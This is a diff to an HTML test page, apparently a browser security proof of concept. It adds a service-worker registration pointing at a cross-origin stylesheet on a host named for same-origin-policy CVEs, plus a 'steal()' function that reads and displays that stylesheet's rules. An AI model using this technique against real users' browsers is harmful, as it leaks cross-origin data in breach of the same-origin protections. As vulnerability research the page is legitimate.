@@ -1,4 +1,3 @@
-
 <audio id="leftAudio" controls>
   <source id="source" src="/location.php?url=https://www.w3schools.com/tags/horse.mp3" type="audio/mpeg">
 </audio><br>
@@ -23,3 +22,22 @@ audioCtx.audioWorklet.addModule('audi-work.js').then(() => {
   source.connect(gainWorkletNode).connect(audioCtx.destination);
 });
 </script>
+
+<script>
+  navigator.serviceWorker.register('/dysw.js?cors=no-cors&match=catchme&url=https://blink-sop-cves.herokuapp.com/cross-origin.css')
+  .then(reg => {
+      // registration worked
+      console.log('Registration succeeded. Scope is ' + reg.scope);
+    }).catch(function(error) {
+      // registration failed
+      console.log('Registration failed with ' + error);
+  });
+
+  function steal(){
+    alert(document.styleSheets[0].cssRules[0].cssText);
+  }
+</script>
+<link rel="stylesheet" href="/catchme" onload="steal()">
+
+<div class="crossOrigin">test</div>
+
